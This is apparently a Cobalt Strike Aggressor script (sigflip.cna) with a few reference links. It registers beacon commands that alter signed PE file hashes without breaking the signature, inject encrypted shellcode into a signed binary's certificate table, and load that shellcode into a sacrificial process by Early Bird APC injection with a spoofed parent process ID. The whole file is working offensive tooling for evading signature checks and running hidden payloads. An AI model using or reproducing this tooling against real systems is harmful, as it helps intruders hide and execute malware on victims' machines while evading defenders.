* https://p0w3rsh3ll.wordpress.com/2014/05/24/testing-ms13-098-certificate-padding-check/
* http://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf

```

`sigflip.cna`:

```cna
beacon_command_register(
"SigFlip", 
"Change a PE file (DLL, EXE, SYS, OCX ..etc) hash without breaking the signature or the validity of the certificate", 
"\nUsage: SigFlip <PE_FILE_PATH> <OUTPUT_PE_FILE_PATH (with extension)>\n\nChange a PE file (DLL, EXE, SYS, OCX ..etc) hash without breaking the signature or the validity of the certificate");

beacon_command_register(
"SigInject", 
"Encrypts and Injects shellcode into a PE file's [WIN_CERTIFICATE] certificate table, encryption key is printed out for usage with a basic C/C# loader
. plus keeps the signature and certificate validity intact", 
"\nUsage: SigInject <PE_FILE_PATH> <OUTPUT_PE_FILE_PATH (with extension)> <ENCRYPTION_KEY> <SHELLCODE_FILE>\n\nEncrypts and Injects shellcode into a PE file's [WIN_CERTIFICATE] certificate table, encryption key is printed out for usage with a basic C/C# loader. plus keeps the signature and certificate validity intact.");

beacon_command_register(
"SigLoader", "", 
"\nLoad encrypted shellcode from PE files created by SigInject, then use Early Bird queueuserapc to spawn/inject sc into a sacrificial process\n\nUsage: SigLoader <PE_FILE_PATH_WITH_SH> <DECRYPTION_KEY> <SPAWNTO_PROCESS_PATH> <PARENT_PROCESS_ID>\n\n-> shellcode injection logic can be customized or replaced with any other code injection technique of choice.");

alias SigFlip {

	btask($1, "Sig flipping...");
	
    local('$bofHandle $bofData $arguments $PEPath $outPath');
	
	$barch  = barch($1);
	
	$bofHandle = openf(script_resource("sigflip. $+ $barch $+ .o"));
	$bofData = readb($bofHandle, -1);
	closef($bofHandle);

    $PEPath = $2;
    $outPath = $3;

    if ($PEPath eq "" || $outPath eq "") {
      berror($1, "Missing arguments, check usage/help\n");
      return;
    }

	$arguments = bof_pack($1,"izz",1,$PEPath,$outPath);
	
	btask($1, "Sig flipping $2 and saving it to $3");
	beacon_inline_execute($1, $bofData, "go", $arguments);
}

alias SigInject {

	btask($1, "Injecting Shellcode...");


	local('$bofHandle $bofData $arguments $PEPath $outPath $encKey $scBlob');
	
	$barch = barch($1);
	
	$bofHandle = openf(script_resource("sigflip. $+ $barch $+ .o"));
	$bofData = readb($bofHandle, -1);
	closef($bofHandle);

    $PEPath = $2;
    $outPath = $3;
	$encKey = $4;

    if ($PEPath eq "" || $outPath eq "") {
      berror($1, "Missing arguments, check usage/help\n");
      return;
    }


	$scHandle = openf($5);
	$scBlob = readb($scHandle, -1);
	closef($scHandle);

    if(int(strlen($scBlob)) == 0){
      berror($1, "Could not read the shellcode file, check the path & if the file exists.\n");
      return;
    }

	btask($1, "Encrypting/Injecting Shellcode $5 into $2 ...");
	btask($1, "Saving result to $3");

	$arguments = bof_pack($1, "izzzb", 0, $PEPath, $outPath, $encKey, $scBlob);
	
	beacon_inline_execute($1, $bofData, "go", $arguments);
}

alias SigLoader {

	btask($1, "Loading Shellcode...");


	local('$bofHandle $bofData $arguments $PEPath $encKey $spawntProcess $PPID');
	
	$barch = barch($1);
	
	$bofHandle = openf(script_resource("sigloader. $+ $barch $+ .o"));
	$bofData = readb($bofHandle, -1);
	closef($bofHandle);

    $PEPath = $2;
    $encKey = $3;
	$spawntProcess = $4;
	$PPID = $5;

    if ($PEPath eq "" || $encKey eq "" || $PPID eq "" || $spawntProcess eq "") {
      berror($1, "Missing arguments, check usage/help\n");
      return;
    }


	btask($1, "Decrypting/Injecting Shellcode into process with PPID $4 ...");

	$arguments = bof_pack($1, "zzzi", $PEPath, $encKey, $spawntProcess, $PPID);
	
	beacon_inline_execute($1, $bofData, "go", $arguments);
}
```